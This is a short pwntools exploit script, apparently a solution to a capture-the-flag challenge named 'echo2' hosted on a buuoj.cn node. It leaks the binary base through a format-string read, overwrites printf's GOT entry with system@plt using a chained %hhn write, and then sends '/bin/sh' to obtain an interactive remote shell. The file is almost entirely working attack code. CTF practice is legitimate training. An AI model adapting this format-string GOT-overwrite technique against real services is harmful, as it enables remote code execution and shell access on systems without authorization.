from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('echo2')
io = remote('node4.buuoj.cn', 25558)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('echo2')


# gdb.attach(io)
io.sendline('%41$p')
elf_base = int(io.recvline()[:-1], 16) - elf.sym['main'] - 74
log.success('elf_base: ' + hex(elf_base))

system_plt = elf_base + elf.plt['system']
printf_got = elf_base + elf.got['printf']
payload, cur_num = b'', 0
for i in range(6):
    target_num = (system_plt >> (i * 8)) & 0xff
    if target_num > cur_num:
        payload += b'%' + str.encode(str(target_num - cur_num)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_num - cur_num)) + b'c'
    cur_num = target_num
    payload += b'%' + str.encode(str(16 + i)) + b'$hhn'
payload = payload.ljust(0x50, b'a')
for i in range(6):
    payload += p64(printf_got + i)
io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
# pause()

